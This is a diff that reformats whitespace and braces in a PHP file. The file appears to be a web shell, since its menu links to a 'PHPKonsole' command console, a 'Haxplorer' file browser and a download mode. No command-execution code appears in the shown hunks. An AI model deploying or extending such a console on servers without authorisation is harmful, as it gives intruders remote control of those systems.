@@ -1920,7 +1635,7 @@ else { /* <!-- There is a incorrect or no parameter specified... Let's open the 
 
 	  <td valign="top" class="silver border">
 
-           <?php echo buildUrl( sp(2)."<font color=\"navy\"><strong>==> PHPKonsole <==</strong></font>", "cmd=con").sp(2); ?>
+           <?php echo buildUrl(sp(2)."<font color=\"navy\"><strong>==> PHPKonsole <==</strong></font>", "cmd=con").sp(2); ?>
 
 	  </td>
 
@@ -1947,16 +1662,13 @@ else { /* <!-- There is a incorrect or no parameter specified... Let's open the 
 	<br>
 
      <?php
-
 }
 
 
 
 if ($cmd != "downl") {
-
-	if ( $isMainMenu != true) {
-
- 		?>
+    if ($isMainMenu != true) {
+        ?>
 
 		<table width="100%" border="0" cellpadding="0" cellspacing="0">
 
@@ -1966,11 +1678,11 @@ if ($cmd != "downl") {
 
 		   <center><strong>
 
-		    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;Main Menu&nbsp;]  </font>", "cmd=&dir=");      ?>&nbsp;&nbsp;
+		    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;Main Menu&nbsp;]  </font>", "cmd=&dir="); ?>&nbsp;&nbsp;
 
-		    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;PHPKonsole&nbsp;] </font>", "cmd=con");        ?>&nbsp;&nbsp;
+		    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;PHPKonsole&nbsp;] </font>", "cmd=con"); ?>&nbsp;&nbsp;
 
-                    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;Haxplorer&nbsp;]  </font>", "cmd=dir&dir=.");  ?> &nbsp;&nbsp;
+                    &nbsp;&nbsp;<?php echo buildUrl("<font color=\"navy\">[&nbsp;Haxplorer&nbsp;]  </font>", "cmd=dir&dir=."); ?> &nbsp;&nbsp;
 
  		   </strong></center>
 
@@ -1983,10 +1695,7 @@ if ($cmd != "downl") {
 		<br>
 
 		<?php
-
-}
-
-	?>
+    } ?>
 
 	<table width=100% border="0" cellpadding="0" cellspacing="0">
 
@@ -2011,8 +1720,7 @@ if ($cmd != "downl") {
 
 
   <?php
-
- }
+}
 
 
 
